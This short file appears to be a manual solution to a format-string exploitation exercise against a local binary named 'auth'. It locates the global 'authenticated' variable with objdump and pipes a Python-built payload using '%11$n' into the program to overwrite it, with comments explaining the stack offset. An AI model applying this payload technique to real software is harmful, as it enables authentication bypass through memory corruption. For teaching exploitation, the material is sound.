# This is manual solution
# Run:
	objdump -t ../auth | grep "authenticated" | cut -d' ' -f1
# Use the address with 0x prefix in the next command
	python -c "import struct; print(struct.pack('I',0xADDRESS_HERE)+'%11\$n')" | ../auth
# If you have 64-bit system and you can't run 32-bit files add "qemu-i386" before "../auth"

# Explanation:
#	The start of the format string is at offset 11 on the stack
#	So we can use the %11$p to print the first 4-bytes of our format string
#		and %11$n to write the number of printed chars so far to it (4).

# We will use the address of the global variable "authenticated"
#	and write to it any value we want
